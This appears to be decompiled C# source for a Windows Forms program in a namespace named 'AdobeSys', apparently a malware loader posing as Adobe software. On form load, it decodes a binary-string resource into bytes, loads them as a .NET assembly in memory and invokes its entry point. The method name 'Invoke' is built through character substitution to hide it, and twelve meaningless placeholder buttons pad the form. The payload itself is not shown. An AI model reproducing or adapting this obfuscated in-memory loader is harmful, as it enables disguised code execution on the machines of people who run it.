using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using AdobeSys.Properties;
using Microsoft.VisualBasic;

namespace AdobeSys;

public class Form1 : Form
{
	private struct Struct0
	{
		public string string_0;

		public byte[] byte_0;

		public Assembly assembly_0;

		public MethodInfo methodInfo_0;
	}

	private IContainer icontainer_0 = null;

	private Button button1;

	private Button button2;

	private Button button3;

	private Button button4;

	private Button button5;

	private Button button6;

	private Button button7;

	private Button button8;

	private Button button9;

	private Button button10;

	private Button button11;

	private Button button12;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Struct0 @struct = default(Struct0);
		@struct.string_0 = Resources.String1;
		@struct.byte_0 = smethod_1(@struct.string_0);
		smethod_0(0, "!nvok@".Replace("!", "I").Replace("@", "e"), null, (CallType)1, Assembly.Load(@struct.byte_0));
	}

	private static void smethod_0(int int_0, string string_0, object object_0, CallType callType_0, Assembly assembly_0)
	{
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		Struct0 @struct = default(Struct0);
		@struct.assembly_0 = assembly_0;
		@struct.methodInfo_0 = @struct.assembly_0.EntryPoint;
		Interaction.CallByName((object)@struct.methodInfo_0, string_0, callType_0, new object[2] { int_0, object_0 });
	}

	private static byte[] smethod_1(string string_0)
	{
		string text = Regex.Replace(string_0, "[^01]", "");
		byte[] array = new byte[text.Length / 8];
		for (int i = 0; i <= array.Length - 1; i++)
		{
			array[i] = Convert.ToByte(text.Substring(i * 8, 8), 2);
		}
		return array;
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_007a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0084: Expected O, but got Unknown
		button1 = new Button();
		button2 = new Button();
		button3 = new Button();
		button4 = new Button();
		button5 = new Button();
		button6 = new Button();
		button7 = new Button();
		button8 = new Button();
		button9 = new Button();
		button10 = new Button();
		button11 = new Button();
		button12 = new Button();
		((Control)this).SuspendLayout();
		((Control)button1).set_Location(new Point(0, 0));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(1088, 521));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("button1");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button2).set_Location(new Point(8, 8));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(1088, 521));
		((Control)button2).set_TabIndex(1);
		((Control)button2).set_Text("button2");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button3).set_Location(new Point(16, 16));
		((Control)button3).set_Name("button3");
		((Control)button3).set_Size(new Size(1088, 521));
		((Control)button3).set_TabIndex(2);
		((Control)button3).set_Text("button3");
		((ButtonBase)button3).set_UseVisualStyleBackColor(true);
		((Control)button4).set_Location(new Point(24, 24));
		((Control)button4).set_Name("button4");
		((Control)button4).set_Size(new Size(1088, 521));
		((Control)button4).set_TabIndex(3);
		((Control)button4).set_Text("button4");
		((ButtonBase)button4).set_UseVisualStyleBackColor(true);
		((Control)button5).set_Location(new Point(32, 32));
		((Control)button5).set_Name("button5");
		((Control)button5).set_Size(new Size(1088, 521));
		((Control)button5).set_TabIndex(4);
		((Control)button5).set_Text("button5");
		((ButtonBase)button5).set_UseVisualStyleBackColor(true);
		((Control)button6).set_Location(new Point(40, 40));
		((Control)button6).set_Name("button6");
		((Control)button6).set_Size(new Size(1088, 521));
		((Control)button6).set_TabIndex(5);
		((Control)button6).set_Text("button6");
		((ButtonBase)button6).set_UseVisualStyleBackColor(true);
		((Control)button7).set_Location(new Point(48, 48));
		((Control)button7).set_Name("button7");
		((Control)button7).set_Size(new Size(1088, 521));
		((Control)button7).set_TabIndex(6);
		((Control)button7).set_Text("button7");
		((ButtonBase)button7).set_UseVisualStyleBackColor(true);
		((Control)button8).set_Location(new Point(56, 56));
		((Control)button8).set_Name("button8");
		((Control)button8).set_Size(new Size(1088, 521));
		((Control)button8).set_TabIndex(7);
		((Control)button8).set_Text("button8");
		((ButtonBase)button8).set_UseVisualStyleBackColor(true);
		((Control)button9).set_Location(new Point(64, 64));
		((Control)button9).set_Name("button9");
		((Control)button9).set_Size(new Size(1088, 521));
		((Control)button9).set_TabIndex(8);
		((Control)button9).set_Text("button9");
		((ButtonBase)button9).set_UseVisualStyleBackColor(true);
		((Control)button10).set_Location(new Point(72, 72));
		((Control)button10).set_Name("button10");
		((Control)button10).set_Size(new Size(1088, 521));
		((Control)button10).set_TabIndex(9);
		((Control)button10).set_Text("button10");
		((ButtonBase)button10).set_UseVisualStyleBackColor(true);
		((Control)button11).set_Location(new Point(80, 80));
		((Control)button11).set_Name("button11");
		((Control)button11).set_Size(new Size(1088, 521));
		((Control)button11).set_TabIndex(10);
		((Control)button11).set_Text("button11");
		((ButtonBase)button11).set_UseVisualStyleBackColor(true);
		((Control)button12).set_Location(new Point(88, 88));
		((Control)button12).set_Name("button12");
		((Control)button12).set_Size(new Size(1088, 521));
		((Control)button12).set_TabIndex(11);
		((Control)button12).set_Text("button12");
		((ButtonBase)button12).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).get_Controls().Add((Control)(object)button12);
		((Control)this).get_Controls().Add((Control)(object)button11);
		((Control)this).get_Controls().Add((Control)(object)button10);
		((Control)this).get_Controls().Add((Control)(object)button9);
		((Control)this).get_Controls().Add((Control)(object)button8);
		((Control)this).get_Controls().Add((Control)(object)button7);
		((Control)this).get_Controls().Add((Control)(object)button6);
		((Control)this).get_Controls().Add((Control)(object)button5);
		((Control)this).get_Controls().Add((Control)(object)button4);
		((Control)this).get_Controls().Add((Control)(object)button3);
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Form1");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
